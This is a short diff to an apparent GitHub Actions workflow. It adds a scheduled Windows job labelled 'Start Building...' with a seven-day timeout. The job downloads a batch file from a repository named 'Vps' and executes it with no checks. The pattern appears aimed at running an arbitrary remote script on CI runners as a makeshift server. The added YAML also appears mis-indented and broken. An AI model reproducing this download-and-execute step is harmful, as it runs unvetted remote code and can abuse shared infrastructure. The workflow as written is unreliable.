@@ -4,4 +4,16 @@ on:
   workflow_dispatch:
   schedule:
   - cron: "0 */24 * * *"
-  
+  jobs:
+  build:
+    name: Start Building...
+    runs-on: windows-latest
+    timeout-minutes: 10080
+    
+    steps:
+    
+      - name: Downloading & Installing Essentials
+        run: |
+          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/VexterLabs/Vps/refs/heads/main/.github/workflows/Downloads.bat" -OutFile "Downloads.bat"
+          cmd /c Downloads.bat
+          
